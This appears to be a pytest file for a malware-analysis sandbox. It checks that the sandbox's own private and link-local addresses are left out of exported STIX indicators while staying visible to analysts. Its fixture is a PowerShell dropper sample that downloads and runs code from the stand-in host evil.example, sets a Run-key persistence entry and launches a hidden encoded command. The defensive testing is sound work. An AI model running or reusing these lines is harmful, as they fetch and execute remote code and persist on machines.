"""The sandbox's own addresses are not indicators of anything.

A detonation guest talks to its own gateway, its sinkhole and its result server
before it talks to anything a malware author chose, so those addresses come back
in every report from every sample. Emitted as a STIX `Indicator` with
`indicator_types=["malicious-activity"]`, they are an accusation — and a TIP
turns an accusation into a blocklist entry.

Measured on the live deployment: `192.168.122.1`, the operator's own libvirt
bridge, was exported as a malicious indicator by 4 of the first 25 malicious
samples checked. A SOC acting on that bundle blocks its own virtualisation host.
And the value was never evidence about the sample: it is evidence about where
the sample happened to be detonated.

Suppressed for the whole private/loopback/link-local space rather than for a
list of this host's own addresses — the sandbox network is private by
construction, and only a public address can be an IOC about somebody else's
infrastructure. It stays in `job.iocs`, because an analyst reading the report
should still see everything the sample contacted; what stops is this deployment
publishing it to the world as malicious.
"""
from __future__ import annotations

import json

import pytest

from app.engine import report as report_mod
from tests.test_api import _poll_until_done, _submit

DROPPER_WITH_LOCAL_C2 = (
    b"$c = New-Object Net.WebClient\n"
    b"$c.DownloadFile('http://192.168.122.1/p.exe', \"$env:TEMP\\p.exe\")\n"
    b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/s')\n"
    b"New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    b" -Name Upd -Value 'p.exe'\n"
    b"powershell -enc SQBFAFgA -w hidden\n"
)


@pytest.mark.parametrize(
    "value",
    [
        "192.168.122.1",     # the libvirt bridge this was measured on
        "10.0.2.2",          # the usual QEMU user-net gateway
        "172.17.0.1",        # the docker bridge this product runs behind
        "127.0.0.1",
        "169.254.169.254",   # cloud metadata: the LAST thing to publish
        "::1",
        "fe80::1",
        "http://192.168.1.5/payload",
        "http://[fd00::1]:8080/x",
    ],
)
def test_our_own_network_is_never_an_indicator(value) -> None:
    assert report_mod._is_own_infrastructure(value), value


@pytest.mark.parametrize(
    "value",
    [
        "8.8.8.8",
        # NOT 203.0.113.x / 198.51.100.x / 192.0.2.x: Python's `ipaddress`
        # classifies the RFC 5737 documentation ranges as private, which is
        # correct and means they are suppressed too — they are just no use as a
        # "genuinely public" fixture.
        "45.33.32.156",
        "http://evil.example/s",
        "evil.example",
        "2001:4860:4860::8888",
        "not-an-address-at-all",
    ],
)
def test_a_real_destination_still_is(value) -> None:
    assert not report_mod._is_own_infrastructure(value), value


def test_the_bundle_does_not_publish_the_guest_network(client, auth) -> None:
    public_id = _submit(client, auth, "dropper.ps1", DROPPER_WITH_LOCAL_C2)
    _poll_until_done(client, auth, public_id)
    response = client.get(f"/api/jobs/{public_id}/export.stix", headers=auth)
    assert response.status_code == 200
    bundle = json.loads(response.content)

    patterns = [o.get("pattern", "") for o in bundle["objects"] if o.get("type") == "indicator"]
    assert not any("192.168.122.1" in p for p in patterns), patterns
    # ...and the accusation the sample actually earned is still made.
    assert any("evil.example" in p for p in patterns), patterns


def test_the_analyst_can_still_see_it(client, auth) -> None:
    """Suppressing the ACCUSATION must not delete the OBSERVATION. An analyst
    asking "what did this thing talk to" needs the whole list."""
    public_id = _submit(client, auth, "dropper.ps1", DROPPER_WITH_LOCAL_C2)
    _poll_until_done(client, auth, public_id)
    detail = client.get(f"/api/result/{public_id}", headers=auth).json()
    flat = json.dumps(detail["iocs"])
    assert "192.168.122.1" in flat, detail["iocs"]
